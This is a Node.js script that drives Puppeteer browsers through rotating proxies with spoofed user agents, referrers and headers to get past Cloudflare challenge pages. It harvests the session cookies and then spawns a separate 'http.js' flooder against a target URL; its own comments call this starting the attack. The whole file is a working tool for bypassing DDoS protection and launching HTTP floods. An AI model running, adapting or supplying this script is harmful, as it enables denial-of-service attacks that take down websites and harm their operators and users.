const fs = require('fs');
const puppeteer = require('puppeteer');
const async = require('async');
const { spawn } = require('child_process');
const crypto = require('crypto');
const path = require('path');

// Constants
const COOKIES_MAX_RETRIES = 3;
const REQUEST_TIMEOUT = 30000; // 30 seconds
const CONCURRENCY_LIMIT = 5; // Limit concurrent requests

// Read user agents from ua.txt
const readUserAgentsFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        return data.trim().split(/\r?\n/);
    } catch (error) {
        console.error('Error reading user agents file:', error);
        return [];
    }
};

// Read proxies from file
const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        return data.trim().split(/\r?\n/);
    } catch (error) {
        console.error('Error reading proxies file:', error);
        return [];
    }
};

// Get command line arguments
if (process.argv.length < 8) {
    console.error("Usage: node script.js <targetURL> <duration> <threads> <proxyFile> <userAgentFile> <referrerFile> <headersFile>");
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const proxyFile = process.argv[5];
const userAgentFile = process.argv[6];
const referrerFile = process.argv[7];
const headersFile = process.argv[8];

const proxies = readProxiesFromFile(proxyFile);
const userAgents = readUserAgentsFromFile(userAgentFile);
const referrers = readUserAgentsFromFile(referrerFile);
const customHeaders = readUserAgentsFromFile(headersFile);

// Get a random element from an array
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

// Sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Detect challenge and handle it
async function detectChallenge(page, proxy) {
    try {
        const title = await page.title();
        const content = await page.content();

        if (title === "Attention Required! | Cloudflare" || content.includes("challenge-platform")) {
            console.log(`Proxy blocked or challenge detected: ${proxy}`);
            // Implement additional bypass methods here
            // Example: Solve CAPTCHA if present
            await solveCaptcha(page);
        } else {
            console.log(`No challenge detected for proxy: ${proxy}`);
        }
    } catch (error) {
        console.error('Error during challenge detection:', error);
    }
}

// Solve CAPTCHA if detected
async function solveCaptcha(page) {
    try {
        const captchaFrames = await page.frames();
        for (const frame of captchaFrames) {
            if (frame.url().includes("captcha")) {
                console.log("Solving CAPTCHA...");
                // Implement CAPTCHA solving logic here
                // For example, using an external CAPTCHA solving service
            }
        }
    } catch (error) {
        console.error('Error solving CAPTCHA:', error);
    }
}

// Open browser and perform tasks
async function openBrowser(targetURL, proxy) {
    const userAgent = getRandomElement(userAgents);
    const referrer = getRandomElement(referrers);
    const screenWidth = Math.floor(Math.random() * 1920) + 800;
    const screenHeight = Math.floor(Math.random() * 1080) + 600;

    const browserOptions = {
        headless: false,
        ignoreHTTPSErrors: true,
        args: [
            `--proxy-server=${proxy}`,
            `--window-size=${screenWidth},${screenHeight}`,
            '--no-sandbox',
            '--disable-setuid-sandbox',
            `--user-agent=${userAgent}`,
            '--disable-gpu'
        ]
    };

    const browser = await puppeteer.launch(browserOptions);
    const [page] = await browser.pages();
    await page.setViewport({ width: screenWidth, height: screenHeight });

    try {
        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: REQUEST_TIMEOUT });
        await page.setExtraHTTPHeaders({
            'Referer': referrer,
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            ...getRandomHeaders()
        });
        await detectChallenge(page, proxy);
        const title = await page.title();
        const cookies = await page.cookies(targetURL);

        return {
            title,
            proxy,
            cookies: cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; '),
            userAgent
        };
    } catch (error) {
        console.error('Error during browser operations:', error);
        return null;
    } finally {
        await browser.close();
    }
}

// Generate random headers from a file
const getRandomHeaders = () => {
    const headers = {};
    for (const header of customHeaders) {
        const [key, value] = header.split(':');
        headers[key.trim()] = value.trim();
    }
    return headers;
};

// Start attack thread
async function startThread(targetURL, proxy, done, retries = 0) {
    if (retries >= COOKIES_MAX_RETRIES) {
        done(null, { proxy });
        return;
    }

    try {
        const response = await openBrowser(targetURL, proxy);
        if (response && response.title === "Just a moment...") {
            console.log(`Bypass failed for proxy: ${proxy}. Retrying...`);
            await startThread(targetURL, proxy, done, retries + 1);
        } else {
            console.log(`Bypass success for proxy: ${proxy}`);
            spawn("node", [
                "http.js",
                targetURL,
                "120", // duration
                "5",   // threads
                proxy,
                "5",   // rate
                response.cookies,
                response.userAgent
            ]);
            done(null, { proxy });
        }
    } catch (error) {
        console.error('Error during thread execution:', error);
        await startThread(targetURL, proxy, done, retries + 1);
    }
}

// Create a queue for managing concurrent tasks
const queue = async.queue(async (task, done) => {
    await startThread(targetURL, task.proxy, done);
}, CONCURRENCY_LIMIT);

// Main function to start the attack
async function main() {
    proxies.forEach(proxy => queue.push({ proxy }));

    await sleep(duration * 1000);
    queue.kill();
    process.exit();
}

// Start the script
main();
